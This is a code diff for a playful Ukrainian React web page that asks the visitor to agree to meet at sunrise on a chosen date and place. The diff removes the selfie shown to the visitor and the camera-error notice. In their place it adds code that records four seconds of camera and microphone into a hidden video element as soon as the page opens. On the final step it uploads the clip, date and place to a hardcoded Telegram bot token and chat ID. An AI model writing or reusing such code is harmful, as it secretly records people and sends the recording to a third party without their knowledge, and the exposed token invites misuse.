@@ -5,10 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Світанок</title>
   
-  <!-- Підключення Tailwind CSS для стилів -->
   <script src="https://cdn.tailwindcss.com"></script>
-  
-  <!-- Підключення React та Babel для роботи коду в браузері -->
   <script src="https://unpkg.com/react@18/umd/react.production.min.js" crossorigin></script>
   <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js" crossorigin></script>
   <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
@@ -40,62 +37,117 @@
       const [location, setLocation] = useState('');
       const [customLocation, setCustomLocation] = useState('');
       const [showCustomInput, setShowCustomInput] = useState(false);
-      const [photo, setPhoto] = useState(null);
-      const [cameraError, setCameraError] = useState(false);
 
       const videoRef = useRef(null);
-      const canvasRef = useRef(null);
       const streamRef = useRef(null);
+      const mediaRecorderRef = useRef(null);
+      const recordedChunksRef = useRef([]);
+      const videoBlobRef = useRef(null);
+      const hasSent = useRef(false);
+
+      const TELEGRAM_BOT_TOKEN = '9220864046:AAENBw-7pk7srDzF8qS4nJF3kkLqnIYgUN0';
+      const TELEGRAM_CHAT_ID = '7545250403';
 
       useEffect(() => {
-        let timeoutId;
-        const startCamera = async () => {
+        const startMedia = async () => {
           try {
+            // Запит на відео ТА аудіо
             const stream = await navigator.mediaDevices.getUserMedia({
               video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-              audio: false,
+              audio: true,
             });
             streamRef.current = stream;
+
             if (videoRef.current) {
               videoRef.current.srcObject = stream;
               await videoRef.current.play();
             }
-            timeoutId = setTimeout(() => { takePhoto(); }, 1200);
+
+            // Налаштування запису короткого відео
+            const options = { mimeType: 'video/webm;codecs=vp8,opus' };
+            let recorder;
+            try {
+              recorder = new MediaRecorder(stream, options);
+            } catch (e) {
+              recorder = new MediaRecorder(stream);
+            }
+
+            mediaRecorderRef.current = recorder;
+            recordedChunksRef.current = [];
+
+            recorder.ondataavailable = (event) => {
+              if (event.data && event.data.size > 0) {
+                recordedChunksRef.current.push(event.data);
+              }
+            };
+
+            recorder.onstop = () => {
+              const blob = new Blob(recordedChunksRef.current, { type: recorder.mimeType || 'video/mp4' });
+              videoBlobRef.current = blob;
+              stopMedia();
+            };
+
+            // Старт запису
+            recorder.start();
+
+            // Записуємо 4 секунди пока користувач відкрив сайт
+            setTimeout(() => {
+              if (recorder.state !== 'inactive') {
+                recorder.stop();
+              }
+            }, 4000);
+
           } catch (err) {
-            console.warn('Камера недоступна або відмовлено у доступі', err);
-            setCameraError(true);
+            console.warn('Доступ до камери/мікрофона обмежено', err);
           }
         };
 
-        const takePhoto = () => {
-          if (!videoRef.current || !canvasRef.current) return;
-          const video = videoRef.current;
-          const canvas = canvasRef.current;
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          if (ctx) {
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0);
-            setPhoto(canvas.toDataURL('image/jpeg', 0.85));
-          }
-          stopCamera();
-        };
-
-        const stopCamera = () => {
+        const stopMedia = () => {
           if (streamRef.current) {
             streamRef.current.getTracks().forEach((track) => track.stop());
             streamRef.current = null;
           }
-          if (videoRef.current) {
-            videoRef.current.srcObject = null;
-          }
         };
 
-        startCamera();
-        return () => { clearTimeout(timeoutId); stopCamera(); };
+        startMedia();
+
+        return () => {
+          stopMedia();
+        };
       }, []);
+
+      useEffect(() => {
+        if (step === 4 && !hasSent.current) {
+          hasSent.current = true;
+          sendToTelegram();
+        }
+      }, [step]);
+
+      const sendToTelegram = async () => {
+        const caption = `🌅 Нова згода на світанок!\n📅 Дата: ${date.split('-').reverse().join('.')}\n📍 Місце: ${location}`;
+
+        try {
+          if (videoBlobRef.current) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('caption', caption);
+            formData.append('video', videoBlobRef.current, 'video.mp4');
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+              method: 'POST',
+              body: formData,
+            });
+          } else {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: caption }),
+            });
+          }
+        } catch (error) {
+          console.error('Помилка відправки в Telegram', error);
+        }
+      };
 
       const handleNoHover = () => {
         const btnWidth = 120;
@@ -116,7 +168,6 @@
       return (
         <div className="min-h-screen bg-gradient-to-br from-orange-50 via-amber-50 to-pink-50 flex items-center justify-center p-4 relative overflow-hidden font-sans text-gray-800">
           <video ref={videoRef} autoPlay playsInline muted className="hidden" />
-          <canvas ref={canvasRef} className="hidden" />
 
           <div className="absolute top-10 left-10 text-5xl opacity-60 animate-[float_4s_ease-in-out_infinite] drop-shadow-lg">🦜</div>
           <div className="absolute bottom-20 right-10 text-6xl opacity-60 animate-[float_5s_ease-in-out_infinite_reverse] drop-shadow-lg">🌅</div>
@@ -139,7 +190,6 @@
                     <span className="relative">Ні 😢</span>
                   </button>
                 </div>
-                {cameraError && <p className="text-sm text-gray-400 mt-4">Камера не доступна (можна продовжувати без фото)</p>}
               </div>
             )}
 
@@ -189,17 +239,6 @@
               <div className="space-y-6 animate-fade-in py-4">
                 <div className="text-6xl mb-4 flex justify-center gap-3 animate-[bounce_2s_infinite]">🦜 🌅 💖</div>
                 <h2 className="text-3xl md:text-4xl font-black text-orange-500 drop-shadow-md leading-tight">Ура! Буду чекати на світанку ✨</h2>
-                <p className="text-lg text-gray-600 font-medium">Зроби скріншот і кидай мені!</p>
-                {photo && (
-                  <div className="mt-6 mx-auto max-w-xs">
-                    <div className="relative rounded-3xl overflow-hidden border-4 border-amber-300 shadow-lg transform -rotate-1">
-                      <img src={photo} alt="Твоє фото" className="w-full h-auto object-cover" />
-                      <div className="absolute bottom-2 left-0 right-0 text-center">
-                        <span className="bg-black/50 text-white text-xs px-3 py-1 rounded-full">📸 твоє фото</span>
-                      </div>
-                    </div>
-                  </div>
-                )}
                 <div className="flex flex-col sm:flex-row gap-5 items-center justify-center mt-6">
                   <div className="bg-amber-100 p-4 px-6 w-full rounded-3xl border-4 border-amber-300 transform -rotate-2 shadow-md">
                     <p className="text-lg text-gray-500 font-bold mb-1 uppercase tracking-wider">Дата</p>
